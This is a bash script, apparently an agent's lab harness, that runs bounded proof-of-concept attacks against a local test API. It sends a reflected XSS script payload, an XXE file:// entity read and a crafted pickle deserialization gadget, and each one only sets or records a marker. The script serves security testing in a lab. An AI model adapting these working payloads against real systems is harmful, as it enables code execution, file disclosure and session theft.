#!/usr/bin/env bash
set -Eeuo pipefail
TARGET="${TARGET:-http://127.0.0.1:18080}"
RUN_ID="modern_api_wave2_$(date -u +%Y%m%dT%H%M%SZ)"
OUT="$HOME/codex-output/$RUN_ID"
mkdir -p "$OUT/xss" "$OUT/xxe" "$OUT/deser"
OBS="$OUT/observations.jsonl"
SUMMARY="$OUT/summary.md"
: > "$OBS"
json_obs(){ python3 - "$OBS" "$@" <<'PY'
import json,sys,datetime
p=sys.argv[1]
d={'ts':datetime.datetime.now(datetime.UTC).isoformat().replace('+00:00','Z')}
for a in sys.argv[2:]:
    if '=' in a:
        k,v=a.split('=',1); d[k]=v
open(p,'a',encoding='utf-8').write(json.dumps(d,ensure_ascii=False)+'\n')
PY
}
status(){ curl -sS -o /dev/null -w '%{http_code}' --max-time 10 "$1" 2>/dev/null || echo 000; }
PRE=$(status "$TARGET/health")
json_obs category=health name=pre status="$PRE" target="$TARGET"
{
  echo "# Modern API Lab Wave 2"
  echo "target: $TARGET"
  echo "pre_health: $PRE"
  echo
} > "$SUMMARY"

# Reliable browser-runtime XSS proof.
echo "## Browser runtime XSS" >> "$SUMMARY"
PAYLOAD=$(python3 - <<'PY'
from urllib.parse import quote
p="</div><script>document.body.setAttribute('data-xss','XSS_RUNTIME_MARKER')</script><div>"
print(quote(p, safe=''))
PY
)
XSS_URL="$TARGET/xss-reflect?q=$PAYLOAD"
DOM="$OUT/xss/dom.txt"
CHROMIUM=$(command -v chromium || command -v chromium-browser || true)
if [ -n "$CHROMIUM" ]; then
  "$CHROMIUM" --headless --disable-gpu --no-sandbox --virtual-time-budget=2000 --dump-dom "$XSS_URL" > "$DOM" 2>"$OUT/xss/chromium.err" || true
else
  curl -sS --max-time 10 "$XSS_URL" > "$DOM" 2>"$OUT/xss/curl.err" || true
fi
XSS_HIT=no
grep -q 'data-xss="XSS_RUNTIME_MARKER"' "$DOM" && XSS_HIT=yes
json_obs category=xss url="$XSS_URL" runtime_marker="$XSS_HIT" dom="$DOM" chromium="$CHROMIUM"
echo "runtime_marker=$XSS_HIT dom=$DOM" >> "$SUMMARY"

# Bounded XXE safe marker proof.
echo >> "$SUMMARY"; echo "## Bounded XXE marker" >> "$SUMMARY"
XXE_FILE="/tmp/hermes_modern_api_xxe_marker.txt"
cat > "$OUT/xxe/payload.xml" <<XML
<?xml version="1.0"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file://$XXE_FILE"> ]>
<data>&xxe;</data>
XML
XXE_BODY="$OUT/xxe/response.json"
XXE_CODE=$(curl -sS --max-time 10 -o "$XXE_BODY" -w '%{http_code}' -H 'Content-Type: application/xml' --data-binary "@$OUT/xxe/payload.xml" "$TARGET/xxe" || echo 000)
XXE_MARKER=$(python3 - "$XXE_BODY" <<'PY'
import json,sys
try: print(json.load(open(sys.argv[1])).get('xxe_marker',''))
except Exception: print('')
PY
)
XXE_HIT=no
[ "$XXE_MARKER" = "XXE_SAFE_MARKER_HERMES_LOCAL_LAB" ] && XXE_HIT=yes
json_obs category=xxe status="$XXE_CODE" marker_found="$XXE_HIT" marker="$XXE_MARKER" request="$OUT/xxe/payload.xml" response="$XXE_BODY"
echo "xxe -> $XXE_CODE marker_found=$XXE_HIT marker=$XXE_MARKER" >> "$SUMMARY"

# Bounded deserialization gadget proof. No shell/command execution; calls server-side record_deser_marker only.
echo >> "$SUMMARY"; echo "## Bounded deserialization gadget" >> "$SUMMARY"
PAYLOAD_JSON="$OUT/deser/payload.json"
python3 - "$PAYLOAD_JSON" <<'PY'
import base64,json,sys
# Protocol-0 pickle: call __main__.record_deser_marker('DESER_SAFE_MARKER_HERMES_LOCAL_LAB') on the server.
# This is intentionally bounded to the server's in-process marker recorder; it does not spawn a shell.
raw = b"c__main__\nrecord_deser_marker\n(VDESER_SAFE_MARKER_HERMES_LOCAL_LAB\ntR."
open(sys.argv[1],'w',encoding='utf-8').write(json.dumps({'payload_b64':base64.b64encode(raw).decode()}))
PY
DESER_BODY="$OUT/deser/response.json"
DESER_CODE=$(curl -sS --max-time 10 -o "$DESER_BODY" -w '%{http_code}' -H 'Content-Type: application/json' --data-binary "@$PAYLOAD_JSON" "$TARGET/deserialize" || echo 000)
DESER_LOG="$OUT/deser/log.json"
LOG_CODE=$(curl -sS --max-time 10 -o "$DESER_LOG" -w '%{http_code}' "$TARGET/deser-log" || echo 000)
DESER_HIT=$(python3 - "$DESER_BODY" "$DESER_LOG" <<'PY'
import json,sys
needle='DESER_SAFE_MARKER_HERMES_LOCAL_LAB'
hit='no'
for p in sys.argv[1:]:
    try:
        if needle in json.dumps(json.load(open(p))): hit='yes'
    except Exception: pass
print(hit)
PY
)
json_obs category=deserialization status="$DESER_CODE" log_status="$LOG_CODE" marker_found="$DESER_HIT" payload="$PAYLOAD_JSON" response="$DESER_BODY" log="$DESER_LOG"
echo "deserialize -> $DESER_CODE log=$LOG_CODE marker_found=$DESER_HIT" >> "$SUMMARY"

POST=$(status "$TARGET/health")
json_obs category=health name=post status="$POST" target="$TARGET"
echo >> "$SUMMARY"; echo "post_health: $POST" >> "$SUMMARY"
echo "$OUT" > "$HOME/codex-output/latest_modern_api_wave2.txt"
echo "$OUT"
